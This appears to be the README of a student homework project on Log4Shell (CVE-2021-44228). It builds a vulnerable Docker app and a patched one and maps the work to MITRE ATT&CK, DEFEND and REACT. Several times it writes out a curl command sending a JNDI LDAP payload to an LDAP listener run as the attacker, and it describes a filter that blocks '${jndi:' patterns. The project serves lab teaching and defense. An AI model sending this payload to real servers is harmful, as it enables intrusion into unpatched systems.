# Log4Shell Homework: Securing Systems Against Log4Shell Exploits Using Docker and MITRE Frameworks

This project demonstrates how to exploit the Log4Shell vulnerability (CVE-2021-44228) in a controlled environment and apply defenses using updated libraries and input validation. The project follows the MITRE ATT&CK, DEFEND, and REACT frameworks to simulate a full security workflow — exploitation, defense, and incident response.

## 📁 Project Structure
```
log4shell-homework/          # Vulnerable app (Log4j 2.14.1, no input validation)
log4shell-homework-patched/  # Patched app (Log4j 2.17.0, input validation added)
ldap_server.py               # LDAP server script to simulate attack
README.md                     # This file
```

## 🛠️ Setup Instructions

### 1. Set Up the Vulnerable Environment

#### a. Build and Run Vulnerable Application
```bash
cd log4shell-homework
docker-compose up --build
```
Application will be available at: [http://localhost:8080](http://localhost:8080)

### 2. Set Up Attacker Server

Install required Python package:
```bash
pip install ldap3
```

Start the LDAP attack server:
```bash
python ldap_server.py
```
The LDAP server will listen on port `389` for connections.

### 3. Exploit the Vulnerability

Send a malicious payload to the vulnerable application:
```bash
curl -X POST http://localhost:8080/log -d '${jndi:ldap://host.docker.internal:389/a}'
```
✅ **Expected:** You should see a connection hit on the LDAP server terminal, indicating the exploit succeeded.

### 4. Apply Security Controls (Patched Environment)

#### a. Deploy the Patched Application
```bash
cd log4shell-homework-patched
docker-compose up --build
```
This version uses:
- Log4j 2.17.0 (patched against Log4Shell)
- Input validation to block `${jndi:` patterns.

### 5. Test the Defenses

#### a. Reattempt the Exploit
```bash
curl -X POST http://localhost:8080/log -d '${jndi:ldap://host.docker.internal:389/a}'
```
✅ **Expected:** Response should be:
```
Invalid input detected
```
No connection should appear in the LDAP server.

#### b. Test Normal Behavior
```bash
curl -X POST http://localhost:8080/log -d 'Hello, world!'
```
✅ **Expected:** Logs normally without errors.

## 🔒 MITRE Frameworks Applied

### MITRE ATT&CK (Exploitation Phase)
- **Tactic:** Initial Access (TA0001)
- **Technique:** Exploit Public-Facing Application (T1190)
- **Action:** Sending a malicious JNDI payload to exploit Log4Shell.

### MITRE DEFEND (Defense Phase)
- **Patch Management:** Upgrade Log4j to a safe version (2.17.0).
- **Input Validation:** Block suspicious payloads by filtering `${jndi:` patterns before logging.

### MITRE REACT (Incident Response Phase)
- **Detect:** Check Docker logs for suspicious payloads (`${jndi:`).
- **Contain:** Take down the vulnerable container (`docker-compose down`).
- **Eradicate:** Ensure no malicious processes remain.
- **Recover:** Deploy the secured version and validate functionality.

## 📦 Deliverables Summary
| File                | Description                                         |
|---------------------|-----------------------------------------------------|
| `pom.xml`            | Maven project file (vulnerable and patched versions) |
| `LogController.java` | Java controller for logging user input              |
| `Dockerfile`         | Dockerfile for building the Spring Boot app         |
| `docker-compose.yml` | Compose file for running the app                    |
| `ldap_server.py`     | Python LDAP server script to simulate Log4Shell     |
| `README.md`          | Setup, exploitation, defense, and incident response instructions |

## ❗ Notes
- `host.docker.internal` is used to allow Docker containers to reach the host system.
- If `host.docker.internal` doesn't work (Linux hosts), you may need to adjust network settings or use your machine's IP address.

## 🚀 Quick Commands

### Build & Run Vulnerable App
```bash
cd log4shell-homework
docker-compose up --build
```

### Launch LDAP Attack Server
```bash
python ldap_server.py
```

### Send Exploit Payload
```bash
curl -X POST http://localhost:8080/log -d '${jndi:ldap://host.docker.internal:389/a}'
```

### Deploy Patched App
```bash
cd log4shell-homework-patched
docker-compose up --build
```
